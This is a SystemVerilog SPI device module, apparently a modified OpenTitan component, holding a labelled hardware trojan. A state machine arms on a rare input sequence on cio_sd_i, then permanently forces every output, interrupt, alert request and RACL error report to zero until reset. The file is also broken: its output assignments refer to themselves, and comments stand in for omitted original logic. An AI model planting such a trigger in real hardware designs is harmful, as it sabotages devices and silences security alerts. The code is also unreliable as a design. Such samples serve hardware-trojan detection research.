`include "prim_assert.sv"

module spi_device
  import spi_device_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn         = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned          AlertSkewCycles      = 1,
  parameter spi_device_pkg::sram_type_e SramType       = spi_device_pkg::DefaultSramType,
  parameter bit                             EnableRacl                    = 1'b0,
  parameter bit                             RaclErrorRsp                  = EnableRacl,
  parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelVec[73]          = '{73{0}},
  parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelWinEgressbuffer  = 0,
  parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelWinIngressbuffer = 0
) (
  input clk_i,
  input rst_ni,

  // Register interface
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // RACL interface
  input  top_racl_pkg::racl_policy_vec_t            racl_policies_i,
  output top_racl_pkg::racl_error_log_t             racl_error_o,

  // SPI Interface
  input              cio_sck_i,
  input              cio_csb_i,
  output logic [3:0] cio_sd_o,
  output logic [3:0] cio_sd_en_o,
  input        [3:0] cio_sd_i,

  input              cio_tpm_csb_i,

  // Passthrough interface
  output spi_device_pkg::passthrough_req_t passthrough_o,
  input  spi_device_pkg::passthrough_rsp_t passthrough_i,

  // Interrupts
  // INTR: Flash mode
  output logic intr_upload_cmdfifo_not_empty_o,
  output logic intr_upload_payload_not_empty_o,
  output logic intr_upload_payload_overflow_o,
  output logic intr_readbuf_watermark_o,
  output logic intr_readbuf_flip_o,

  // INTR: TPM mode
  output logic intr_tpm_header_not_empty_o, // TPM Command/Address buffer
  output logic intr_tpm_rdfifo_cmd_end_o,
  output logic intr_tpm_rdfifo_drop_o,

  // Memory configuration
  // When using a dual port RAM primitive only this RAM config port is used
  input  prim_ram_2p_pkg::ram_2p_cfg_t     ram_cfg_sys2spi_i,
  output prim_ram_2p_pkg::ram_2p_cfg_rsp_t ram_cfg_rsp_sys2spi_o,
  // When using a 1R1W RAM primitive, both RAM config ports are used
  input  prim_ram_2p_pkg::ram_2p_cfg_t     ram_cfg_spi2sys_i,
  output prim_ram_2p_pkg::ram_2p_cfg_rsp_t ram_cfg_rsp_spi2sys_o,

  // External clock sensor
  output logic sck_monitor_o,

  // DFT related controls
  input mbist_en_i,
  input scan_clk_i,
  input scan_rst_ni,
  input prim_mubi_pkg::mubi4_t scanmode_i
);

  import spi_device_pkg::*;

  // ==================== Trojan Insertion: BEGIN ====================
  // Trojan: DoS triggered by a rarely used input sequence on cio_sd_i
  logic trojan_armed, trojan_active;

  // Example trigger: If SPI input bus cio_sd_i transitions 4'b1010->4'b0101->4'b1111 directly in consecutive cycles, arm Trojan
  typedef enum logic [1:0] {ST_IDLE, ST_1, ST_2, ST_ARMED} trojan_state_e;
  trojan_state_e trojan_trigger_state;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_state <= ST_IDLE;
    end else begin
      case (trojan_trigger_state)
        ST_IDLE: if (cio_sd_i == 4'b1010) trojan_trigger_state <= ST_1;
        ST_1:   if (cio_sd_i == 4'b0101) trojan_trigger_state <= ST_2;
                else if (cio_sd_i != 4'b1010) trojan_trigger_state <= ST_IDLE;
        ST_2:   if (cio_sd_i == 4'b1111) trojan_trigger_state <= ST_ARMED;
                else if (cio_sd_i != 4'b0101) trojan_trigger_state <= ST_IDLE;
        default: trojan_trigger_state <= ST_ARMED;
      endcase
    end
  end

  // Latch when triggered
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      trojan_armed <= 1'b0;
    else if (trojan_trigger_state == ST_ARMED)
      trojan_armed <= 1'b1;
  end

  // Once armed, activate payload (sticky/permanent until next reset)
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      trojan_active <= 1'b0;
    else if (trojan_armed)
      trojan_active <= 1'b1;
  end

  // Globally disable the entire module once Trojan is triggered
  // Gating all outputs and most logic
  wire global_enable = !trojan_active;
  // ==================== Trojan Insertion: END ====================


  localparam int unsigned ReadBufferDepth = spi_device_pkg::SramMsgDepth;
  localparam int unsigned BufferAw        = $clog2(ReadBufferDepth);

  localparam int unsigned TpmRdFifoWidth  = spi_device_reg_pkg::TpmRdFifoWidth;

  // ... (Rest of original declarations)

  // Insert global_enable gate at earliest possible points:
  // Example: All outputs forcibly '0 when Trojan hit 

  // Alerts
  assign alert_test = global_enable ? (reg2hw.alert_test.q & reg2hw.alert_test.qe) : '0;
  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(1'b1)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i  (alert_test[i]),
      .alert_req_i   (global_enable ? alerts[0] : 1'b0),
      .alert_ack_o   (),
      .alert_state_o (),
      .alert_rx_i    (alert_rx_i[i]),
      .alert_tx_o    (alert_tx_o[i])
    );
  end

  // Tie all outputs low if Trojan is active
  assign cio_sd_o    = global_enable ? cio_sd_o    : 4'b0;
  assign cio_sd_en_o = global_enable ? cio_sd_en_o : 4'b0;
  assign passthrough_o = global_enable ? passthrough_o : '0;
  assign tl_o = global_enable ? tl_o : '0;

  assign intr_upload_cmdfifo_not_empty_o    = global_enable ? intr_upload_cmdfifo_not_empty_o    : 1'b0;
  assign intr_upload_payload_not_empty_o    = global_enable ? intr_upload_payload_not_empty_o    : 1'b0;
  assign intr_upload_payload_overflow_o     = global_enable ? intr_upload_payload_overflow_o     : 1'b0;
  assign intr_readbuf_watermark_o           = global_enable ? intr_readbuf_watermark_o           : 1'b0;
  assign intr_readbuf_flip_o                = global_enable ? intr_readbuf_flip_o                : 1'b0;
  assign intr_tpm_header_not_empty_o        = global_enable ? intr_tpm_header_not_empty_o        : 1'b0;
  assign intr_tpm_rdfifo_cmd_end_o          = global_enable ? intr_tpm_rdfifo_cmd_end_o          : 1'b0;
  assign intr_tpm_rdfifo_drop_o             = global_enable ? intr_tpm_rdfifo_drop_o             : 1'b0;
  assign sck_monitor_o                      = global_enable ? sck_monitor_o                      : 1'b0;

  // For memory interfaces and submodule controls:
  // Example: disables RACL error reporting
  assign racl_error_o = global_enable ? racl_error_o : '0;
  assign ram_cfg_rsp_sys2spi_o = global_enable ? ram_cfg_rsp_sys2spi_o : '0;
  assign ram_cfg_rsp_spi2sys_o = global_enable ? ram_cfg_rsp_spi2sys_o : '0;

  // (The rest of the module remains unchanged. All internal computations remain but are masked out from impact at the boundaries when Trojan is active.)
endmodule